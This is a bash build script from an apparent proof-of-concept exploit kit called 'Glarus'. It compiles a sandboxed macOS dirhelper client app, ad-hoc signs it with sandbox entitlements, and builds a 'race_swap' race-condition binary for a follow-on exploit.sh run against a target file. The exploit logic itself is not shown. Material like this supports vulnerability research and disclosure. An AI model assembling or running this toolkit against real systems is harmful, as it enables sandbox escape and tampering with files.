#!/bin/bash
#
# build.sh - Glarus PoC Build Script
#
# Builds all components required for the exploit:
# 1. Sandboxed dirhelper client app bundle
# 2. Race condition binary
#
# Copyright (c) 2025 Golden Helm Securities
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
SRC_DIR="$ROOT_DIR/src"
BUILD_DIR="$ROOT_DIR/build"
APP_NAME="DirhelperClient"

# CRITICAL: This must match the bundle ID used in exploit.sh/setup.sh
BUNDLE_ID="${GLARUS_BUNDLE_ID:-com.glarus.poc}"

echo "═══════════════════════════════════════════════════════════════"
echo "  Glarus PoC - Build"
echo "═══════════════════════════════════════════════════════════════"
echo

# Check for required tools
if ! command -v clang &> /dev/null; then
    echo "ERROR: clang not found. Install Xcode Command Line Tools:"
    echo "  xcode-select --install"
    exit 1
fi

if ! command -v codesign &> /dev/null; then
    echo "ERROR: codesign not found. Install Xcode Command Line Tools:"
    echo "  xcode-select --install"
    exit 1
fi

# Create build directory
mkdir -p "$BUILD_DIR"

# Check source files exist
if [ ! -f "$SRC_DIR/dirhelper_client.c" ]; then
    echo "ERROR: src/dirhelper_client.c not found"
    exit 1
fi

if [ ! -f "$SRC_DIR/race_swap.c" ]; then
    echo "ERROR: src/race_swap.c not found"
    exit 1
fi

if [ ! -f "$SRC_DIR/entitlements.plist" ]; then
    echo "ERROR: src/entitlements.plist not found"
    exit 1
fi

#───────────────────────────────────────────────────────────────────────────────
# Detect architecture
#───────────────────────────────────────────────────────────────────────────────
ARCH=$(uname -m)
if [ "$ARCH" = "arm64" ]; then
    ARCH_FLAGS="-arch arm64"
elif [ "$ARCH" = "x86_64" ]; then
    ARCH_FLAGS="-arch x86_64"
else
    ARCH_FLAGS=""
fi

#───────────────────────────────────────────────────────────────────────────────
# Step 1: Build dirhelper client
#───────────────────────────────────────────────────────────────────────────────
echo "[1/3] Compiling dirhelper client..."

clang -o "$BUILD_DIR/$APP_NAME" \
    $ARCH_FLAGS \
    -Wall -Wextra \
    -O2 \
    -framework Foundation \
    "$SRC_DIR/dirhelper_client.c"

echo "      ✓ Compiled successfully"

#───────────────────────────────────────────────────────────────────────────────
# Step 2: Create app bundle
#───────────────────────────────────────────────────────────────────────────────
echo "[2/3] Creating sandboxed app bundle..."

APP_BUNDLE="$BUILD_DIR/${APP_NAME}.app"
rm -rf "$APP_BUNDLE"
mkdir -p "$APP_BUNDLE/Contents/MacOS"
mkdir -p "$APP_BUNDLE/Contents/Resources"

# Move binary into bundle
mv "$BUILD_DIR/$APP_NAME" "$APP_BUNDLE/Contents/MacOS/"

# Create Info.plist
cat > "$APP_BUNDLE/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>${APP_NAME}</string>
    <key>CFBundleIdentifier</key>
    <string>${BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>${APP_NAME}</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>LSMinimumSystemVersion</key>
    <string>14.0</string>
    <key>NSHighResolutionCapable</key>
    <true/>
</dict>
</plist>
EOF

# Sign with entitlements
codesign --force --sign - \
    --entitlements "$SRC_DIR/entitlements.plist" \
    "$APP_BUNDLE"

echo "      ✓ App bundle created"

# Verify sandbox entitlement
if codesign -d --entitlements - "$APP_BUNDLE" 2>&1 | grep -q "app-sandbox"; then
    echo "      ✓ Signed with sandbox entitlements"
else
    echo "      ⚠ Warning: Sandbox entitlement not found"
fi

#───────────────────────────────────────────────────────────────────────────────
# Step 3: Build race binary
#───────────────────────────────────────────────────────────────────────────────
echo "[3/3] Compiling race binary..."

clang -O3 \
    $ARCH_FLAGS \
    -Wall -Wextra \
    -o "$BUILD_DIR/race_swap" \
    "$SRC_DIR/race_swap.c"

echo "      ✓ Race binary compiled"

#───────────────────────────────────────────────────────────────────────────────
# Done
#───────────────────────────────────────────────────────────────────────────────
echo
echo "═══════════════════════════════════════════════════════════════"
echo "  ✓ Build Complete"
echo "═══════════════════════════════════════════════════════════════"
echo
echo "Built artifacts:"
echo "  • $APP_BUNDLE"
echo "  • $BUILD_DIR/race_swap"
echo
echo "Next step: ./scripts/exploit.sh <target_file>"
echo
